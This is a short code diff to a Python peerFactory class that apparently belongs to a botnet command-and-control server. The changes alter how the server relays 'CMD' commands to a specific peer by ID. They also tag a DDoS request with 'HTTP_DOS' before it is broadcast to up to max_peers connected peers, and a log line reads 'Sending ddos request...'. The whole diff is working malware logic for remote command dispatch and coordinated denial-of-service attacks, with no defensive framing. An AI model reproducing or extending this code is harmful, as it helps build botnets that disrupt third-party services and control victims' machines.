@@ -59,7 +59,7 @@ class peerFactory(protocol.Factory):
                     msg = message.split('::')
                     if op == 'CMD': 
                         pid = msg[1] #Peer ID
-                        peer_cmd = msg[2]
+                        peer_cmd = 'CMD:' + msg[2]
                         for peer_id, connection in self.peers.items(): 
                             #Match peer id of message with the id of peers connection
                             if pid == peer_id:
@@ -74,6 +74,7 @@ class peerFactory(protocol.Factory):
                         logging.debug('Sending ddos request...')
                         for peer_id, connection in self.peers.items():
                             if n_peers <= max_peers:
+                                ddos_msg = 'HTTP_DOS' + ddos_msg
                                 self.peers[peer_id].transport.write(ddos_msg.encode('utf-8'))
                                 n_peers += 1
                         peer_msg.remove(message)
